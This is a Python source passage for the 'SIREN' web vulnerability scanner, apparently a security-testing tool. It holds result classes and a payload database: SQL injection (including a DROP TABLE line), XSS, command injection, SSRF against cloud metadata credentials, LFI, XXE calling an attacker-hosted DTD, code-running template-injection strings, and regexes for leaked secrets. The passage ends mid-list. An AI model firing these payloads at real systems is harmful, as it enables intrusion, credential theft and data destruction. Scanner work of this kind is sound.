#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
████████████████████████████████████████████████████████████████████████████████████
██                                                                                ██
██  💉  SIREN VULNERABILITY SCANNER — Deteccao Real de Vulnerabilidades  💉      ██
██                                                                                ██
██  Scanner completo com deteccao REAL para:                                      ██
██    • SQL Injection (Error/Blind/Time/Union/Stacked)                            ██
██    • XSS (Reflected/Stored/DOM-based)                                          ██
██    • Command Injection (OS/Eval/Template)                                      ██
██    • SSRF (Internal/Cloud Metadata/Protocol)                                   ██
██    • Path Traversal (LFI/RFI/Directory)                                        ██
██    • IDOR (Direct Object Reference)                                            ██
██    • Authentication Bypass                                                     ██
██    • CSRF (Cross-Site Request Forgery)                                         ██
██    • Header Injection (CRLF/Host/Open Redirect)                               ██
██    • Information Disclosure (Stack Traces/Debug/Source)                         ██
██    • Security Misconfigurations (Headers/CORS/Cookies)                         ██
██    • XXE (XML External Entity)                                                 ██
██    • SSTI (Server-Side Template Injection)                                     ██
██    • Deserialization                                                            ██
██    • JWT Vulnerabilities                                                        ██
██                                                                                ██
██  "O scanner nao adivinha. Ele PROVA."                                         ██
██                                                                                ██
████████████████████████████████████████████████████████████████████████████████████
"""

from __future__ import annotations

import asyncio
import base64
import enum
import hashlib
import hmac
import json
import logging
import math
import os
import random
import re
import string
import struct
import time
import urllib.parse
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import (
    Any,
    Callable,
    Dict,
    FrozenSet,
    List,
    Literal,
    Optional,
    Set,
    Tuple,
    Union,
)

logger = logging.getLogger("siren.scanner")


# ════════════════════════════════════════════════════════════════════════════
# SEVERITY & CONFIDENCE
# ════════════════════════════════════════════════════════════════════════════


class Severity(enum.Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

    @property
    def score_range(self) -> Tuple[float, float]:
        return {
            "critical": (9.0, 10.0),
            "high": (7.0, 8.9),
            "medium": (4.0, 6.9),
            "low": (0.1, 3.9),
            "info": (0.0, 0.0),
        }[self.value]

    @property
    def icon(self) -> str:
        return {
            "critical": "🔴",
            "high": "🟠",
            "medium": "🟡",
            "low": "🟢",
            "info": "🔵",
        }[self.value]


class Confidence(enum.Enum):
    CONFIRMED = "confirmed"
    FIRM = "firm"
    TENTATIVE = "tentative"

    @property
    def weight(self) -> float:
        return {"confirmed": 1.0, "firm": 0.7, "tentative": 0.3}[self.value]


class VulnCategory(enum.Enum):
    SQLI = "sql-injection"
    XSS = "cross-site-scripting"
    CMDI = "command-injection"
    SSRF = "server-side-request-forgery"
    LFI = "local-file-inclusion"
    RFI = "remote-file-inclusion"
    PATH_TRAVERSAL = "path-traversal"
    IDOR = "insecure-direct-object-reference"
    AUTH_BYPASS = "authentication-bypass"
    CSRF = "cross-site-request-forgery"
    CRLF = "crlf-injection"
    OPEN_REDIRECT = "open-redirect"
    INFO_DISCLOSURE = "information-disclosure"
    MISCONFIG = "security-misconfiguration"
    XXE = "xml-external-entity"
    SSTI = "server-side-template-injection"
    DESERIALIZATION = "insecure-deserialization"
    JWT = "jwt-vulnerability"
    CORS = "cors-misconfiguration"
    HOST_HEADER = "host-header-injection"
    NOSQLI = "nosql-injection"
    LDAP_INJECTION = "ldap-injection"
    HEADER_INJECTION = "header-injection"
    RACE_CONDITION = "race-condition"
    BUSINESS_LOGIC = "business-logic-flaw"


# ════════════════════════════════════════════════════════════════════════════
# VULNERABILITY FINDING
# ════════════════════════════════════════════════════════════════════════════


@dataclass
class VulnFinding:
    """Representacao completa de uma vulnerabilidade encontrada."""

    title: str
    category: VulnCategory
    severity: Severity
    confidence: Confidence
    url: str
    method: str = "GET"
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    description: str = ""
    impact: str = ""
    remediation: str = ""
    cwe_id: int = 0
    cvss_score: float = 0.0
    cvss_vector: str = ""
    request_dump: str = ""
    response_dump: str = ""
    response_time_ms: float = 0.0
    references: List[str] = field(default_factory=list)
    tags: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    agent: str = ""
    phase: str = ""
    is_false_positive: bool = False

    @property
    def unique_id(self) -> str:
        raw = f"{self.category.value}:{self.url}:{self.parameter}:{self.payload}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    def to_dict(self) -> dict:
        return {
            "id": self.unique_id,
            "title": self.title,
            "category": self.category.value,
            "severity": self.severity.value,
            "confidence": self.confidence.value,
            "url": self.url,
            "method": self.method,
            "parameter": self.parameter,
            "payload": self.payload,
            "evidence": self.evidence[:500],
            "description": self.description,
            "impact": self.impact,
            "remediation": self.remediation,
            "cwe_id": self.cwe_id,
            "cvss_score": self.cvss_score,
            "cvss_vector": self.cvss_vector,
            "response_time_ms": self.response_time_ms,
            "references": self.references,
            "tags": self.tags,
            "timestamp": self.timestamp,
        }

    def to_markdown(self) -> str:
        lines = [
            f"### {self.severity.icon} {self.title}",
            "",
            f"| Field | Value |",
            f"|-------|-------|",
            f"| Category | `{self.category.value}` |",
            f"| Severity | **{self.severity.value.upper()}** |",
            f"| Confidence | {self.confidence.value} |",
            f"| CVSS | {self.cvss_score} |",
            f"| CWE | CWE-{self.cwe_id} |",
            f"| URL | `{self.url}` |",
            f"| Method | `{self.method}` |",
            f"| Parameter | `{self.parameter}` |",
            "",
        ]
        if self.description:
            lines.extend(["**Description:**", self.description, ""])
        if self.payload:
            lines.extend(["**Payload:**", f"```\n{self.payload}\n```", ""])
        if self.evidence:
            lines.extend(["**Evidence:**", f"```\n{self.evidence[:1000]}\n```", ""])
        if self.impact:
            lines.extend(["**Impact:**", self.impact, ""])
        if self.remediation:
            lines.extend(["**Remediation:**", self.remediation, ""])
        if self.request_dump:
            lines.extend(
                ["**Request:**", f"```http\n{self.request_dump[:800]}\n```", ""]
            )
        if self.response_dump:
            lines.extend(
                [
                    "**Response (excerpt):**",
                    f"```http\n{self.response_dump[:800]}\n```",
                    "",
                ]
            )
        if self.references:
            lines.append("**References:**")
            for ref in self.references:
                lines.append(f"- {ref}")
            lines.append("")
        return "\n".join(lines)


# ════════════════════════════════════════════════════════════════════════════
# SCAN CONFIGURATION
# ════════════════════════════════════════════════════════════════════════════


@dataclass
class ScanConfig:
    """Configuracao completa de scan."""

    target_url: str
    max_depth: int = 5
    max_pages: int = 200
    max_concurrent: int = 10
    request_delay_ms: float = 100.0
    timeout_seconds: float = 30.0
    follow_redirects: bool = True
    max_redirects: int = 5

    # Authentication
    auth_cookies: Dict[str, str] = field(default_factory=dict)
    auth_headers: Dict[str, str] = field(default_factory=dict)
    auth_bearer_token: str = ""

    # Scope
    scope_include: List[str] = field(default_factory=list)
    scope_exclude: List[str] = field(default_factory=list)
    excluded_extensions: List[str] = field(
        default_factory=lambda: [
            ".jpg",
            ".jpeg",
            ".png",
            ".gif",
            ".ico",
            ".svg",
            ".bmp",
            ".webp",
            ".css",
            ".woff",
            ".woff2",
            ".ttf",
            ".eot",
            ".otf",
            ".mp3",
            ".mp4",
            ".avi",
            ".mov",
            ".wmv",
            ".flv",
            ".pdf",
            ".doc",
            ".docx",
            ".xls",
            ".xlsx",
            ".ppt",
            ".zip",
            ".rar",
            ".7z",
            ".tar",
            ".gz",
        ]
    )

    # Scan modules
    enable_sqli: bool = True
    enable_xss: bool = True
    enable_cmdi: bool = True
    enable_ssrf: bool = True
    enable_lfi: bool = True
    enable_xxe: bool = True
    enable_ssti: bool = True
    enable_idor: bool = True
    enable_auth: bool = True
    enable_cors: bool = True
    enable_headers: bool = True
    enable_info_disclosure: bool = True
    enable_open_redirect: bool = True
    enable_crlf: bool = True
    enable_nosqli: bool = True
    enable_jwt: bool = True

    # Aggressive
    aggressive_mode: bool = False
    verify_ssl: bool = False
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"


@dataclass
class ScanResult:
    """Resultado consolidado de um scan."""

    target: str
    start_time: float = 0.0
    end_time: float = 0.0
    pages_scanned: int = 0
    requests_sent: int = 0
    findings: List[VulnFinding] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    crawled_urls: Set[str] = field(default_factory=set)
    forms_found: int = 0
    parameters_tested: int = 0

    @property
    def duration_seconds(self) -> float:
        if self.end_time and self.start_time:
            return self.end_time - self.start_time
        return 0.0

    @property
    def severity_counts(self) -> Dict[str, int]:
        counts: Dict[str, int] = {}
        for f in self.findings:
            counts[f.severity.value] = counts.get(f.severity.value, 0) + 1
        return counts

    def add_finding(self, finding: VulnFinding) -> None:
        if finding.unique_id not in {f.unique_id for f in self.findings}:
            self.findings.append(finding)

    def to_dict(self) -> dict:
        return {
            "target": self.target,
            "duration_seconds": round(self.duration_seconds, 2),
            "pages_scanned": self.pages_scanned,
            "requests_sent": self.requests_sent,
            "forms_found": self.forms_found,
            "parameters_tested": self.parameters_tested,
            "total_findings": len(self.findings),
            "severity_counts": self.severity_counts,
            "findings": [f.to_dict() for f in self.findings],
            "errors": self.errors[:50],
        }


# ════════════════════════════════════════════════════════════════════════════
# PAYLOAD DATABASE — Payloads reais para cada tipo de vulnerabilidade
# ════════════════════════════════════════════════════════════════════════════

# ---------- SQL Injection ----------

SQLI_ERROR_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR '1'='1' --",
    '" OR "1"="1" --',
    "' OR '1'='1' #",
    "' OR 1=1 --",
    '" OR 1=1 --',
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "') OR ('1'='1",
    "') OR ('1'='1'--",
    "'||'",
    "1;SELECT 1",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1' WAITFOR DELAY '0:0:5'--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1'; SELECT SLEEP(5)--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
    "'; EXEC xp_cmdshell('whoami')--",
    "1; DROP TABLE users--",
    "admin'--",
    "admin' #",
    "admin'/*",
    "1' OR '1'='1' LIMIT 1--",
    "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
    "' HAVING 1=1--",
    "' GROUP BY columnnames having 1=1--",
    "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
]

SQLI_BLIND_PAYLOADS = [
    ("1' AND 1=1--", "1' AND 1=2--"),
    ("1' AND 'a'='a'--", "1' AND 'a'='b'--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND SUBSTRING(@@version,1,1)='5'--", "1' AND SUBSTRING(@@version,1,1)='x'--"),
    ("1 AND (SELECT COUNT(*) FROM users)>0", "1 AND (SELECT COUNT(*) FROM users)<0"),
]

SQLI_TIME_PAYLOADS = [
    ("1' AND SLEEP({delay})--", 5),
    ("1' AND (SELECT SLEEP({delay}))--", 5),
    ("1'; WAITFOR DELAY '0:0:{delay}'--", 5),
    ("1' AND BENCHMARK(10000000,SHA1('test'))--", 5),
    ("1'; SELECT pg_sleep({delay})--", 5),
    ("1' AND 1=(SELECT 1 FROM PG_SLEEP({delay}))--", 5),
    ("1' || (SELECT CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE pg_sleep(0) END)--", 5),
]

SQLI_ERROR_PATTERNS = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"warning.*mysql", re.I),
    re.compile(r"unclosed quotation mark", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
    re.compile(r"syntax error.*near", re.I),
    re.compile(r"microsoft ole db provider for sql server", re.I),
    re.compile(r"ORA-\d{5}", re.I),
    re.compile(r"pg_query\(\)", re.I),
    re.compile(r"PostgreSQL.*ERROR", re.I),
    re.compile(r"SQLite3::query", re.I),
    re.compile(r"sqlite3\.OperationalError", re.I),
    re.compile(r"SQLSTATE\[\w+\]", re.I),
    re.compile(r"mysql_fetch", re.I),
    re.compile(r"mysqli_", re.I),
    re.compile(r"com\.mysql\.jdbc", re.I),
    re.compile(r"java\.sql\.SQLException", re.I),
    re.compile(r"org\.postgresql\.util\.PSQLException", re.I),
    re.compile(r"Microsoft Access Driver", re.I),
    re.compile(r"JET Database Engine", re.I),
    re.compile(r"ODBC.*Driver", re.I),
    re.compile(r"supplied argument is not a valid MySQL", re.I),
    re.compile(r"SQL Server.*Driver.*SQL Server", re.I),
    re.compile(r"Exception.*\WSystem\.Data\.SqlClient\.", re.I),
    re.compile(r"Unclosed quotation mark after the character string", re.I),
    re.compile(r"Driver.*SQL[\-\_\ ]*Server", re.I),
    re.compile(r"Column count doesn't match value count", re.I),
    re.compile(r"Unknown column", re.I),
    re.compile(r"Table.*doesn't exist", re.I),
    re.compile(r"MariaDB server version for the right syntax", re.I),
]

# ---------- XSS ----------

XSS_PAYLOADS = [
    '<script>alert("SIREN")</script>',
    '<img src=x onerror=alert("SIREN")>',
    '<svg onload=alert("SIREN")>',
    '<body onload=alert("SIREN")>',
    '"><script>alert("SIREN")</script>',
    "' onfocus=alert('SIREN') autofocus='",
    '" onfocus="alert(\'SIREN\')" autofocus="',
    "<img src=x onerror=alert(String.fromCharCode(83,73,82,69,78))>",
    "<iframe src=\"javascript:alert('SIREN')\">",
    '<details open ontoggle=alert("SIREN")>',
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('SIREN')>",
    '<input type="image" src=x onerror=alert("SIREN")>',
    '<video src=x onerror=alert("SIREN")>',
    '<audio src=x onerror=alert("SIREN")>',
    '<marquee onstart=alert("SIREN")>',
    '<meter onmouseover=alert("SIREN")>0</meter>',
    '<isindex type=image src=1 onerror=alert("SIREN")>',
    "javascript:alert('SIREN')",
    "data:text/html,<script>alert('SIREN')</script>",
    "<a href=\"javascript:alert('SIREN')\">click</a>",
    "'-alert('SIREN')-'",
    "\";alert('SIREN');//",
    "</script><script>alert('SIREN')</script>",
    "{{constructor.constructor('alert(1)')()}}",
    "${alert('SIREN')}",
    "#{alert('SIREN')}",
    "<object data=\"javascript:alert('SIREN')\">",
    "<embed src=\"javascript:alert('SIREN')\">",
    "<form action=\"javascript:alert('SIREN')\"><input type=submit>",
    '"><img src=x onerror=alert("SIREN")>',
    "' onmouseover='alert(1)'",
    "<div style=\"width:expression(alert('SIREN'))\">",
    '<link rel="import" href="data:text/html,<script>alert(1)</script>">',
]

XSS_REFLECTION_MARKERS = [
    ("SIREN_XSS_CANARY_" + hashlib.md5(str(i).encode()).hexdigest()[:8], i)
    for i in range(10)
]

XSS_CONTEXT_DETECTORS = {
    "html_tag": re.compile(r"<[^>]*SIREN_XSS_CANARY_[a-f0-9]+[^>]*>", re.I),
    "html_attr_dq": re.compile(r'="[^"]*SIREN_XSS_CANARY_[a-f0-9]+[^"]*"', re.I),
    "html_attr_sq": re.compile(r"='[^']*SIREN_XSS_CANARY_[a-f0-9]+[^']*'", re.I),
    "html_attr_nq": re.compile(r"=SIREN_XSS_CANARY_[a-f0-9]+[\s>]", re.I),
    "js_string_dq": re.compile(r'"[^"]*SIREN_XSS_CANARY_[a-f0-9]+[^"]*"', re.I),
    "js_string_sq": re.compile(r"'[^']*SIREN_XSS_CANARY_[a-f0-9]+[^']*'", re.I),
    "js_template": re.compile(r"`[^`]*SIREN_XSS_CANARY_[a-f0-9]+[^`]*`", re.I),
    "html_comment": re.compile(r"<!--[^>]*SIREN_XSS_CANARY_[a-f0-9]+[^>]*-->", re.I),
    "css_value": re.compile(r":[^;]*SIREN_XSS_CANARY_[a-f0-9]+[^;]*;", re.I),
    "url_param": re.compile(r"[?&]\w+=SIREN_XSS_CANARY_[a-f0-9]+", re.I),
    "raw_body": re.compile(r"SIREN_XSS_CANARY_[a-f0-9]+", re.I),
}

# ---------- Command Injection ----------

CMDI_PAYLOADS = [
    "; whoami",
    "| whoami",
    "|| whoami",
    "& whoami",
    "&& whoami",
    "` whoami `",
    "$( whoami )",
    "; id",
    "| id",
    "|| id",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "&& cat /etc/passwd",
    "; ping -c 3 127.0.0.1",
    "| ping -c 3 127.0.0.1",
    "; sleep {delay}",
    "| sleep {delay}",
    "& sleep {delay}",
    "|| sleep {delay}",
    "&& sleep {delay}",
    "$(sleep {delay})",
    "`sleep {delay}`",
    "; ping -n 5 127.0.0.1",
    "| ping -n 5 127.0.0.1",
    "& ping -n 5 127.0.0.1",
    "\n/bin/cat /etc/passwd",
    "\nwhoami",
    "\nid",
    "{cmd}",
    "{{cmd}}",
    "%0awhoami",
    "%0a%0dwhoami",
    ";\r\nwhoami",
]

CMDI_SUCCESS_PATTERNS = [
    re.compile(r"root:.*:0:0:", re.I),
    re.compile(r"uid=\d+\(.*?\)\s+gid=\d+", re.I),
    re.compile(r"(?:www-data|apache|nginx|nobody|daemon)", re.I),
    re.compile(r"(?:Windows|WORKGROUP)\\[\w]+", re.I),
    re.compile(r"nt authority\\", re.I),
    re.compile(r"PING\s+\d+\.\d+\.\d+\.\d+", re.I),
    re.compile(r"bytes from \d+\.\d+\.\d+\.\d+", re.I),
    re.compile(r"Reply from \d+\.\d+\.\d+\.\d+", re.I),
]

# ---------- SSRF ----------

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:27017",
    "http://127.0.0.1:9200",
    "http://127.0.0.1:11211",
    "http://169.254.169.254",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://169.254.169.254/openstack/latest/meta_data.json",
    "http://169.254.169.254/2021-03-23/meta-data/",
    "http://0177.0.0.1",
    "http://0x7f000001",
    "http://2130706433",
    "http://017700000001",
    "http://0x7f.0x0.0x0.0x1",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:6379/INFO",
    "gopher://127.0.0.1:6379/_INFO%0d%0a",
    "ftp://127.0.0.1",
    "http://0/",
    "http://[0:0:0:0:0:ffff:127.0.0.1]",
    "http://①②⑦.⓪.⓪.①",
    "http://127.0.0.1.nip.io",
    "http://localtest.me",
    "http://spoofed.burpcollaborator.net",
]

SSRF_INDICATORS = [
    re.compile(r"root:.*:0:0:", re.I),
    re.compile(r"\[fonts\]", re.I),
    re.compile(r"ami-id", re.I),
    re.compile(r"instance-id", re.I),
    re.compile(r"AccessKeyId", re.I),
    re.compile(r"SecretAccessKey", re.I),
    re.compile(r"redis_version", re.I),
    re.compile(r"MongoDB server version", re.I),
    re.compile(r"OpenSSH", re.I),
    re.compile(r"Connection refused", re.I),
    re.compile(r"Connection reset", re.I),
    re.compile(r"Name or service not known", re.I),
    re.compile(r"No route to host", re.I),
]

# ---------- Path Traversal / LFI ----------

LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
    "/etc/passwd%00",
    "/etc/passwd%00.jpg",
    "....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/fd/0",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "php://filter/read=string.rot13/resource=index.php",
    "expect://whoami",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=",
    "c:\\windows\\system32\\drivers\\etc\\hosts",
    "c:\\windows\\win.ini",
    "c:\\boot.ini",
    "c:\\inetpub\\wwwroot\\web.config",
]

LFI_SUCCESS_PATTERNS = [
    re.compile(r"root:.*:0:0:", re.I),
    re.compile(r"\[extensions\]", re.I),
    re.compile(r"\[fonts\]", re.I),
    re.compile(r"127\.0\.0\.1\s+localhost", re.I),
    re.compile(r"\[boot loader\]", re.I),
    re.compile(r"<\?php", re.I),
    re.compile(r"HTTP_USER_AGENT", re.I),
    re.compile(r"DOCUMENT_ROOT", re.I),
    re.compile(r"USER=", re.I),
    re.compile(r"PATH=.*:", re.I),
    re.compile(r"ConnectionString", re.I),
]

# ---------- XXE ----------

XXE_PAYLOADS = [
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">%xxe;]><foo>test</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
]

# ---------- SSTI ----------

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"),
    ("${7*'7'}", "7777777"),
    ("{{config}}", "<Config"),
    ("{{self.__class__}}", "<class"),
    ("{{request}}", "<Request"),
    ("{{lipsum.__globals__}}", "os"),
    ('{{"".__class__.__mro__}}', "object"),
    ("{{url_for.__globals__}}", "current_app"),
    ("{{get_flashed_messages.__globals__}}", "current_app"),
    ("{{cycler.__init__.__globals__.os.popen('id').read()}}", "uid="),
    ("{{joiner.__init__.__globals__.os.popen('whoami').read()}}", ""),
    (
        "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\")}}{% endif %}{% endfor %}",
        "uid=",
    ),
    ("${T(java.lang.Runtime).getRuntime().exec('id')}", "Process"),
    ("*{T(java.lang.Runtime).getRuntime().exec('id')}", "Process"),
    ("${{<%[%'\"}}%\\", ""),
    ("{{constructor.constructor('return this')()}}", "[object"),
]

# ---------- CRLF ----------

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:siren=injected",
    "%0aSet-Cookie:siren=injected",
    "%0d%0aX-Injected:true",
    "\r\nSet-Cookie:siren=injected",
    "\nX-Injected:true",
    "%E5%98%8A%E5%98%8DSet-Cookie:siren=injected",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "\\r\\nX-Injected:true",
    "%5cr%5cnSet-Cookie:siren=injected",
]

# ---------- Open Redirect ----------

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com%23",
    "https://evil.com%2f%2f",
    "////evil.com",
    "\t//evil.com",
    "https:evil.com",
    "http://evil.com",
    "/redirect?url=https://evil.com",
    "//evil.com/%2f..",
    "///evil.com",
    "https://evil.com@legitimate.com",
    "https://legitimate.com.evil.com",
    "jaVasCript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d",
]

REDIRECT_PARAMS = [
    "url",
    "redirect",
    "redirect_url",
    "redirect_uri",
    "return",
    "return_url",
    "returnTo",
    "return_to",
    "next",
    "next_url",
    "target",
    "to",
    "link",
    "goto",
    "dest",
    "destination",
    "rurl",
    "out",
    "view",
    "login_url",
    "image_url",
    "continue",
    "window",
    "data",
    "reference",
    "site",
    "html",
    "val",
    "validate",
    "domain",
    "callback",
    "r",
    "u",
    "redir",
    "redirect_to",
    "ReturnUrl",
    "forward",
    "file",
    "path",
]

# ---------- NoSQL Injection ----------

NOSQLI_PAYLOADS = [
    '{"$gt":""}',
    '{"$ne":""}',
    '{"$regex":".*"}',
    '{"$where":"1==1"}',
    '{"$or":[{},{"a":"a"}]}',
    "true, $where: '1 == 1'",
    "'; return '' == '",
    '";return(true);var foo="',
    "1;sleep(5000)",
    "1;return true",
    '{"username":{"$gt":""},"password":{"$gt":""}}',
    '{"$nin":[1]}',
    '{"$exists":true}',
    '{"$regex":"^a"}',
]

# ---------- Security Headers Check ----------

EXPECTED_SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "severity": Severity.MEDIUM,
        "description": "Missing HSTS header. Site vulnerable to SSL stripping attacks.",
        "cwe": 523,
    },
    "X-Content-Type-Options": {
        "severity": Severity.LOW,
        "description": "Missing X-Content-Type-Options header. MIME sniffing possible.",
        "cwe": 16,
    },
    "X-Frame-Options": {
        "severity": Severity.MEDIUM,
        "description": "Missing X-Frame-Options header. Clickjacking possible.",
        "cwe": 1021,
    },
    "Content-Security-Policy": {
        "severity": Severity.MEDIUM,
        "description": "Missing Content-Security-Policy header. XSS impact amplified.",
        "cwe": 693,
    },
    "X-XSS-Protection": {
        "severity": Severity.LOW,
        "description": "Missing X-XSS-Protection header.",
        "cwe": 79,
    },
    "Referrer-Policy": {
        "severity": Severity.LOW,
        "description": "Missing Referrer-Policy header. Information leakage via referrer.",
        "cwe": 200,
    },
    "Permissions-Policy": {
        "severity": Severity.LOW,
        "description": "Missing Permissions-Policy header.",
        "cwe": 16,
    },
}

# ---------- Information Disclosure Patterns ----------

INFO_DISCLOSURE_PATTERNS = [
    (
        re.compile(r"(?:PHP|Fatal) error:.*in\s+(/[\w/.]+\.php)\s+on line\s+\d+", re.I),
        "PHP Error with file path",
        Severity.MEDIUM,
    ),
    (
        re.compile(r"Traceback \(most recent call last\)", re.I),
        "Python traceback",
        Severity.MEDIUM,
    ),
    (
        re.compile(r"at\s+[\w$.]+\([\w]+\.java:\d+\)", re.I),
        "Java stack trace",
        Severity.MEDIUM,
    ),
    (
        re.compile(r"System\.Web\.HttpException", re.I),
        ".NET exception",
        Severity.MEDIUM,
    ),
    (re.compile(r"Microsoft-IIS/[\d.]+", re.I), "IIS version disclosure", Severity.LOW),
    (re.compile(r"Apache/[\d.]+", re.I), "Apache version disclosure", Severity.LOW),
    (re.compile(r"nginx/[\d.]+", re.I), "Nginx version disclosure", Severity.LOW),
    (
        re.compile(r"X-Powered-By:\s*(.+)", re.I),
        "Technology disclosure via X-Powered-By",
        Severity.LOW,
    ),
    (
        re.compile(
            r"(?:access_key|secret_key|api_key|apikey|token)\s*[:=]\s*['\"]?[\w\-]+",
            re.I,
        ),
        "Potential credential exposure",
        Severity.HIGH,
    ),
    (
        re.compile(r"(?:password|passwd|pwd)\s*[:=]\s*['\"]?[^\s'\"]+", re.I),
        "Potential password exposure",
        Severity.CRITICAL,
    ),
    (
        re.compile(r"-----BEGIN (?:RSA )?PRIVATE KEY-----", re.I),
        "Private key exposure",
        Severity.CRITICAL,
    ),
    (
        re.compile(r"-----BEGIN CERTIFICATE-----", re.I),
        "Certificate exposure",
        Severity.MEDIUM,
    ),
    (
        re.compile(
            r"<input[^>]*type=['\"]?password['\"]?[^>]*value=['\"]?[^'\"]+", re.I
        ),
        "Password pre-filled in form",
        Severity.HIGH,
    ),
    (
        re.compile(r"(?:mysql|postgresql|mongodb|redis|sqlite)://[^\s<>\"']+", re.I),
        "Database connection string",
        Severity.CRITICAL,
    ),
    (re.compile(r"AKIA[0-9A-Z]{16}", re.I), "AWS Access Key ID", Severity.CRITICAL),
    (
        re.compile(r"(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}", re.I),
        "GitHub token",
        Severity.CRITICAL,
    ),
    (re.compile(r"sk-[A-Za-z0-9]{48}", re.I), "OpenAI API key", Severity.CRITICAL),
    (
        re.compile(r"(?:DEBUG|DEVELOPMENT|STAGING)\s*[:=]\s*(?:true|1|on|yes)", re.I),
        "Debug mode enabled",
        Severity.MEDIUM,
    ),
    (re.compile(r"/\.git/", re.I), "Git directory exposure", Severity.HIGH),
    (re.compile(r"/\.env", re.I), ".env file exposure", Severity.CRITICAL),
    (re.compile(r"phpinfo\(\)", re.I), "phpinfo() exposure", Severity.MEDIUM),
    (re.compile(r"/wp-admin/", re.I), "WordPress admin path", Severity.INFO),
    (
        re.compile(r"(?:TODO|FIXME|HACK|XXX|BUG):?\s+", re.I),
        "Developer comment in production",
        Severity.INFO,
    ),
]

# ---------- JWT ----------

JWT_ALGORITHMS = ["none", "None", "NONE", "nOnE", "HS256", "HS384", "HS512"]

JWT_WEAK_SECRETS = [
    "secret",
    "password",
    "123456",
    "admin",
    "key",
    "jwt_secret",
    "test",
    "changeme",
    "default",
    "your-256-bit-secret",
    "my-secret",
    "supersecret",
